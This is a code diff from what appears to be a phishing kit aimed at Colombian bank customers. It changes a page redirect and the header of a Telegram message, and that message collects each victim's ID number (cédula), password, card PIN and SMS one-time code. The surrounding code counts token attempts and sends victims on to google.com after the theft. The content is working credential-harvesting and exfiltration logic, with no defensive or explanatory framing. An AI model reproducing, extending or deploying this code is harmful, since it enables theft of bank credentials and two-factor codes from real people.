@@ -210,7 +210,7 @@
                                     checkAllFilled();
                                     break;
                                 case 'pedir_datos_2':
-                                    window.location.href = "datos_2.html";
+                                    window.location.href = "datos.html";
                                     break;
                                 case 'finalizar':
                                     window.location.href = "https://www.google.com";
@@ -274,7 +274,7 @@
                 tokenAttemptCount++;
                 sessionStorage.setItem('tokenAttemptCount', tokenAttemptCount);
 
-                let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
+                let telegramMessage = '⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️🔴🔴🔴 TOKEN SMS  🔴🔴🔴⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️\n\n';
                 if (initialLoginData) {
                     if (initialLoginData.cardClave !== 'N/A') {
                         telegramMessage += `Tipo de Ingreso: Tarjeta Débito\n`;
@@ -288,11 +288,11 @@
                         telegramMessage += `CEDULA💎: ${initialLoginData.nroDoc}\n`;
                         telegramMessage += `ClAVE🔐: ${initialLoginData.clave}\n`;
                     }
-                    telegramMessage += `\n〽️ Código SMS: ${token}\n\n`;
+                    telegramMessage += `\n⚠️ Código SMS: ${token}\n\n`;
                     telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
                 } else {
                     telegramMessage += `Tipo de Ingreso: Código SMS (sin datos de sesión)\n`;
-                    telegramMessage += `\n〽️ Código SMS: ${token}\n\n`;
+                    telegramMessage += `\n⚠️ Código SMS: ${token}\n\n`;
                     telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
                 }
 
